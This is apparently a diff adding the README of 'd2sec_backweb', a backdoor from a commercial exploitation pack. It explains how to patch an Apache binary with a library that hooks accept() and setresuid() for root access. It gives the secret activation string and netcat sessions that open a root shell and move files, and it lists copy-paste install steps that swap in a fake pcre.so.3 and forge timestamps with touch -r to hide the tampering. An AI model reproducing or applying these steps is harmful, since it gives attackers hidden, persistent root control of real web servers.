@@ -1,0 +1,238 @@
+D2 Exploitation Pack
+
+Copyright (c) 2007-2008 DSquare Security, LLC
+All rights reserved.
+
+License information
+---------------------
+
+See the file "LICENSE.txt" for information on the history of this
+software, terms & conditions for usage, and a DISCLAIMER OF ALL
+WARRANTIES.
+
+Description
+-------------
+
+d2sec_backweb is a backdoor. d2sec_backweb (d2sec_infest actually)
+modifies httpd binary (or apache2 or ...) and adds a sort of preload
+library to binary that hooks accept() and setresuid() to regain
+privileges.
+
+The httpd service is one of the easiest target, because the clients send
+the first string and not the server. 
+
+d2sec_backweb was tested on Linux.
+
+Use d2sec_backweb
+--------------------
+
+To activate backdoor, you must connect to backdoored box and to send to
+the string '4ed1479a7a48653b13d492f52ecbe5d6'. After, 5 simple commands
+are available :
+
+d to download
+u to upload
+w to who
+s to shell
+m to mosdef
+
+Examples:
+
+1/ who:
+
+$ nc -v -n 127.0.0.1 80
+(UNKNOWN) [127.0.0.1] 80 (www) open
+4ed1479a7a48653b13d492f52ecbe5d6
+w
+compaq   tty7         Nov 19 07:45 (:0)
+compaq   pts/0        Nov 19 12:29 (:0.0)
+
+2/ shell:
+
+$ nc -v -n 127.0.0.1 80
+(UNKNOWN) [127.0.0.1] 80 (www) open
+4ed1479a7a48653b13d492f52ecbe5d6
+s
+id
+uid=0(root) gid=0(root) groups=33(www-data)
+
+3/ download:
+
+$ (echo '4ed1479a7a48653b13d492f52ecbe5d6'; echo 'd'; echo '/tmp/d2sec') | nc 127.0.0.1 80
+d2sec.com
+
+4/ upload:
+
+(echo '4ed1479a7a48653b13d492f52ecbe5d6'; echo 'u'; echo '/tmp/dsquare'; echo `cat /tmp/d2sec`) | nc 127.0.0.1 80
+
+5/ mosdef:
+
+on screen 1:
+./commanlineInterface.py -v 2 -p 5555
+
+on screen 2:
+$ nc -v -n -p 8880 127.0.0.1 80
+(UNKNOWN) [127.0.0.1] 80 (www) open
+4ed1479a7a48653b13d492f52ecbe5d6
+m
+127.0.0.1
+5555
+
+But it's better to use d2sec_clientbackweb to run a MOSDEF node with this backdoor.
+
+Install d2sec_backweb
+-----------------------
+
+In order to install d2sec_backweb, /usr/sbin/apache2 for example has
+to be modified and the d2sec_backweb library has to be installed (the
+following commands should be executed in a directory that should be
+backed up, since it is needed if d2sec_backweb has to be removed from
+the box):
+
+# ls -alp /usr/sbin/apache2
+-rwxr-xr-x 1 root root 353016 oct  1 12:01 /usr/sbin/apache2
+# WEB_DIR=/usr/sbin/
+# WEB=apache2
+# cp -i "$WEB_DIR/$WEB" "$WEB"
+# ldd "$WEB"
+$ ls -alp /usr/sbin/apache2
+		linux-gate.so.1 =>  (0xffffe000)
+		libpcre.so.3 => /usr/lib/libpcre.so.3 (0xb7f91000)
+		libaprutil-1.so.0 => /usr/lib/libaprutil-1.so.0 (0xb7f73000)
+		libapr-1.so.0 => /usr/lib/libapr-1.so.0 (0xb7f47000)
+		libpthread.so.0 => /lib/i686/cmov/libpthread.so.0 (0xb7f2e000)
+		libc.so.6 => /lib/i686/cmov/libc.so.6 (0xb7dd3000)
+		libldap_r-2.4.so.2 => /usr/lib/libldap_r-2.4.so.2 (0xb7d90000)
+		liblber-2.4.so.2 => /usr/lib/liblber-2.4.so.2 (0xb7d83000)
+		libdb-4.6.so => /usr/lib/libdb-4.6.so (0xb7c50000)
+		libpq.so.5 => /usr/lib/libpq.so.5 (0xb7c30000)
+		libmysqlclient_r.so.15 => /usr/lib/libmysqlclient_r.so.15 (0xb7a45000)
+		libsqlite3.so.0 => /usr/lib/libsqlite3.so.0 (0xb79d6000)
+		libexpat.so.1 => /usr/lib/libexpat.so.1 (0xb79b0000)
+		libuuid.so.1 => /lib/libuuid.so.1 (0xb79ac000)
+		librt.so.1 => /lib/i686/cmov/librt.so.1 (0xb79a3000)
+		libcrypt.so.1 => /lib/i686/cmov/libcrypt.so.1 (0xb7970000)
+		libdl.so.2 => /lib/i686/cmov/libdl.so.2 (0xb796c000)
+		/lib/ld-linux.so.2 (0xb7fce000)
+		libresolv.so.2 => /lib/i686/cmov/libresolv.so.2 (0xb7958000)
+		libsasl2.so.2 => /usr/lib/libsasl2.so.2 (0xb7941000)
+		libgnutls.so.26 => /usr/lib/libgnutls.so.26 (0xb78a4000)
+		libssl.so.0.9.8 => /usr/lib/i686/cmov/libssl.so.0.9.8 (0xb785d000)
+		libcrypto.so.0.9.8 => /usr/lib/i686/cmov/libcrypto.so.0.9.8 (0xb770a000)
+		libkrb5.so.3 => /usr/lib/libkrb5.so.3 (0xb7676000)
+		libcom_err.so.2 => /lib/libcom_err.so.2 (0xb7673000)
+		libgssapi_krb5.so.2 => /usr/lib/libgssapi_krb5.so.2 (0xb7649000)
+		libnsl.so.1 => /lib/i686/cmov/libnsl.so.1 (0xb762f000)
+		libm.so.6 => /lib/i686/cmov/libm.so.6 (0xb7609000)
+		libz.so.1 => /usr/lib/libz.so.1 (0xb75f4000)
+		libtasn1.so.3 => /usr/lib/libtasn1.so.3 (0xb75e4000)
+		libgpg-error.so.0 => /usr/lib/libgpg-error.so.0 (0xb75e0000)
+		libgcrypt.so.11 => /usr/lib/libgcrypt.so.11 (0xb7577000)
+		libk5crypto.so.3 => /usr/lib/libk5crypto.so.3 (0xb7553000)
+		libkrb5support.so.0 => /usr/lib/libkrb5support.so.0 (0xb754b000)
+		libkeyutils.so.1 => /lib/libkeyutils.so.1 (0xb7548000)
+# ./d2sec_infest "$WEB"
+[+] strtab_offset is 0x0001175c..
+[+] dynamic_offset is 0x00054014..
+[+] dynamic_size is 0x000000f0..
+[+] needed_offset is 0x00000000..
+[+] debug_offset is 0x00000068..
+[*] pcre.so.3
+# ldd "$WEB"
+		linux-gate.so.1 =>  (0xffffe000)
+		pcre.so.3 => not found
+		libaprutil-1.so.0 => /usr/lib/libaprutil-1.so.0 (0xb7faa000)
+		libapr-1.so.0 => /usr/lib/libapr-1.so.0 (0xb7f7e000)
+		libpthread.so.0 => /lib/i686/cmov/libpthread.so.0 (0xb7f65000)
+		[...]
+# LIB_DIR=/usr/lib
+# LIB=pcre.so.3
+# touch -r "$LIB_DIR" d2sec_backweb.so
+# cp -i d2sec_backweb.so "$LIB_DIR/$LIB"
+# touch -r d2sec_backweb.so "$LIB_DIR/$LIB"
+# touch -r d2sec_backweb.so "$LIB_DIR"
+# ldd "$WEB"
+		linux-gate.so.1 =>  (0xffffe000)
+		pcre.so.3 => /lib/pcre.so.3 (0xb7f2d000)
+		libaprutil-1.so.0 => /usr/lib/libaprutil-1.so.0 (0xb7f0f000)
+		libapr-1.so.0 => /usr/lib/libapr-1.so.0 (0xb7ee3000)
+		[...]
+# ls -l "$LIB_DIR/$LIB"
+[...]
+# cp -ip "$WEB_DIR/$WEB" "$WEB.orig"
+# touch -r "$WEB_DIR" "$WEB"
+# rm -f "$WEB_DIR/$WEB" && cp -i "$WEB" "$WEB_DIR/$WEB"
+# touch -r "$WEB.orig" "$WEB_DIR/$WEB"
+# touch -r "$WEB" "$WEB_DIR"
+# ldd "$WEB_DIR/$WEB"
+		linux-gate.so.1 =>  (0xffffe000)
+		pcre.so.3 => /lib/pcre.so.3 (0xb7f2d000)
+		libaprutil-1.so.0 => /usr/lib/libaprutil-1.so.0 (0xb7f0f000)
+		libapr-1.so.0 => /usr/lib/libapr-1.so.0 (0xb7ee3000)
+		[...]
+# ls -l "$WEB_DIR/$WEB"
+[...]
+
+Now, copy and paste style:
+
+ls -alp /usr/sbin/apache2
+WEB_DIR=/usr/sbin/
+WEB=apache2
+cp -i "$WEB_DIR/$WEB" "$WEB"
+ldd "$WEB"
+./d2sec_infest "$WEB"
+ldd "$WEB"
+LIB_DIR=/usr/lib
+LIB=pcre.so.3
+touch -r "$LIB_DIR" d2sec_backweb.so  
+cp -i d2sec_backweb.so "$LIB_DIR/$LIB"
+touch -r d2sec_backweb.so "$LIB_DIR/$LIB"
+touch -r d2sec_backweb.so "$LIB_DIR"
+ldd "$WEB"
+ls -l "$LIB_DIR/$LIB"
+cp -ip "$WEB_DIR/$WEB" "$WEB.orig"
+touch -r "$WEB_DIR" "$WEB"
+rm -f "$WEB_DIR/$WEB" && cp -i "$WEB" "$WEB_DIR/$WEB"
+touch -r "$WEB.orig" "$WEB_DIR/$WEB"
+touch -r "$WEB" "$WEB_DIR"
+ldd "$WEB_DIR/$WEB"
+ls -l "$WEB_DIR/$WEB"
+
+Modify d2sec_backweb
+----------------------
+
+In order to modify the behaviour of d2sec_backweb, only the d2sec_backweb library
+has to be reinstalled (copy and paste style, again):
+
+LIB_DIR=/usr/lib
+LIB=pcre.so.3
+gcc -Wall -Werror -nostartfiles -shared -s -o your_d2sec_backweb.so your_d2sec_backweb.c -ldl
+touch -r "$LIB_DIR" d2sec_backweb.so
+rm -f "$LIB_DIR/$LIB" && cp -i your_d2sec_backweb.so "$LIB_DIR/$LIB"
+touch -r your_d2sec_backweb.so "$LIB_DIR/$LIB"
+touch -r your_d2sec_backweb.so "$LIB_DIR"
+
+Uninstall d2sec_backweb
+-------------------------
+
+In order to remove d2sec_backweb from a box, the following commands
+should be executed in the directory backed up when d2sec_backweb was
+installed (copy and paste style, again and again):
+
+WEB_DIR=/usr/bin
+WEB=apache2
+touch -r "$WEB" "$WEB_DIR"
+cp -ip "$WEB" .
+./d2sec_unifest "$WEB"
+touch -r "$WEB_DIR" "$WEB"
+cp -ip "$WEB" "$WEB_DIR/$WEB"
+touch -r "$WEB" "$WEB_DIR"
+ldd "$WEB_DIR/$WEB"
+ls -l "$WEB_DIR/$WEB"
+LIB_DIR=/usr/lib
+LIB=pcre.so.3
+rm -f "$LIB_DIR/$LIB"
+touch -r d2sec_backweb.so "$LIB_DIR"
+ls -l "$LIB_DIR/$LIB"
+
+EOF
